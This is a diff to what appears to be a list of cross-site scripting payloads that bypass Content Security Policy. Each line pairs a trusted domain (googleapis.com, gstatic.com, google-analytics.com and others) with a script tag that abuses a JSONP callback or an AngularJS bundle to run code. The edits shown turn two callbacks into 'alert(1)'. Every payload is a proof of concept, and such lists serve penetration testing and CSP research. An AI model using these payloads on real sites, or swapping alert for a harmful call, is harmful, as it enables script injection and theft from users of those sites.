@@ -189,8 +189,8 @@ www.blogger.com	<script src="https://www.blogger.com/feeds/8063678697117239807/p
 www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.google.com	<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
 www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
-www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>
-www.googleapis.com	<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert"></script>
+www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert(1)"></script>
+www.googleapis.com	<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert(1)"></script>
 www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
 www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
@@ -216,3 +216,4 @@ pages.nist.gov	<body ng-app ng-csp><script src="https://pages.nist.gov/opensourc
 s.yimg.jp	<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 
 api.usabilla.com	<script src="https://api.usabilla.com/v2/feedback/c263014c1857.config?jsonp=alert"></script>
+
